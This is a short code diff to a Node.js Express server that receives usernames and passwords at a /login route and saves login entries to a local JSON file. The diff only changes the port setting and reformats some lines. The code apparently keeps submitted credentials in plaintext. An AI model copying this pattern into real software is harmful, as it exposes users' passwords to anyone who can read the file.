@@ -3,7 +3,7 @@ const fs = require("fs");
 const path = require("path");
 
 const app = express();
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 const DATA_FILE = path.join(__dirname, "data", "logins.json");
 
 // Middleware
@@ -27,7 +27,9 @@ app.post("/login", (req, res) => {
   const { username, password } = req.body;
 
   if (!username || !password) {
-    return res.status(400).json({ success: false, message: "All fields are required." });
+    return res
+      .status(400)
+      .json({ success: false, message: "All fields are required." });
   }
 
   // Read existing data
@@ -53,7 +55,9 @@ app.post("/login", (req, res) => {
   // Write back to file
   fs.writeFileSync(DATA_FILE, JSON.stringify(logins, null, 2));
 
-  console.log(`✅ Login saved — User: ${username} | Time: ${newEntry.timestamp}`);
+  console.log(
+    `✅ Login saved — User: ${username} | Time: ${newEntry.timestamp}`,
+  );
 
   return res.json({ success: true, message: "Login saved successfully!" });
 });
